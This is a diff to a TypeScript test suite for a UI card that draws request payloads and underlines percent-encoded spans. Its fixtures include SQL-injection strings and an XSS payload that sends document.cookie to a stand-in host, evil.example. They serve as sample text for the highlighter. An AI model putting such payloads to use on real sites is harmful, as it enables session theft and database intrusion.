@@ -51,11 +51,32 @@ describe('card v2', () => {
     expect(CHIP_COLOR).toEqual({ GET: '#2fb6ff', POST: '#d9b44a', SSH: '#5fd38d', SMTP: '#b48cff', TCP: '#a4a197' });
   });
 
-  it('finds every percent-escape and plus, and nothing else', () => {
-    expect(encodedSpans('q=%27%20OR%201%3D1--')).toEqual([[2, 5], [5, 8], [10, 13], [14, 17]]);
-    expect(encodedSpans('q=blue+wool+socks')).toEqual([[6, 7], [11, 12]]);
-    expect(encodedSpans("q=' OR 1=1--")).toEqual([]);
-    expect(encodedSpans('100% sure, %zz')).toEqual([]);
+  it('finds every percent-escape, and the plus only inside a GET query string', () => {
+    expect(encodedSpans('q=%27%20OR%201%3D1--', 'GET')).toEqual([[2, 5], [5, 8], [10, 13], [14, 17]]);
+    expect(encodedSpans('q=blue+wool+socks', 'GET')).toEqual([[6, 7], [11, 12]]);
+    expect(encodedSpans("q=' OR 1=1--", 'GET')).toEqual([]);
+    expect(encodedSpans('100% sure, %zz', 'GET')).toEqual([]);
+    // In a JS body the + is an operator, not a space; an escape is an escape on any chip.
+    expect(encodedSpans(`"<script>fetch('//evil.example/?c='+document.cookie)</script>"`, 'POST')).toEqual([]);
+    expect(encodedSpans('user=a%40b.example pass=x+y', 'POST')).toEqual([[6, 9]]);
+  });
+
+  it('dots one cyan underline per encoded span with the hints off', () => {
+    const calls: string[] = [];
+    drawCard(fakeCtx(calls), { ...card(["' OR 1=1--"], false), payload: 'q=%27%20OR%201%3D1--' });
+    expect(strokes(calls)).toBe(4);
+  });
+
+  it('computes the spans on the ellipsized text, so none starts past the cut', () => {
+    const calls: string[] = [];
+    // 100 characters with an escape every 20: the card shows 79 of them and an ellipsis, so the fifth escape is cut off.
+    const payload = Array.from({ length: 5 }, (_, i) => `%4${i}${'x'.repeat(17)}`).join('');
+    drawCard(fakeCtx(calls), { ...card([], false), payload });
+    const shown = calls.find((c) => c.startsWith('fillText:%40x'))!.slice('fillText:'.length);
+    expect(shown).toHaveLength(80);
+    expect(shown.endsWith('…')).toBe(true);
+    expect(calls.filter((c) => /^fillText:%4\d$/.test(c))).toEqual(['fillText:%40', 'fillText:%41', 'fillText:%42', 'fillText:%43']);
+    expect(strokes(calls)).toBe(4);
   });
 
   it('draws the chip, the path, the source and the payload without touching the tells', () => {
